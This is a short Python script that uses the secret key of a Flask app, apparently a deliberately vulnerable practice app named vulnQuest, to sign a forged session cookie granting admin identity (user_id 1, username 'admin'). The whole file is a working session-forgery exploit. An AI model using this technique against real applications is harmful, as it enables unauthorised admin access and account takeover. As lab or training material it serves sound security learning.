from flask.sessions import SecureCookieSessionInterface
from vulnQuest import app  # Import the Flask app from vulnQuest.py

# Create a new instance of your Flask app's session interface
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

admin_session_data = {
    'admin_session_key': 'default_admin_session', 
    'session_key': 'default_admin_session', 
    'user_id': 1, 
    'username': 'admin'
}

# Encode session data
encoded_session = session_serializer.dumps(admin_session_data)
print(f"Encoded admin session: {encoded_session}")
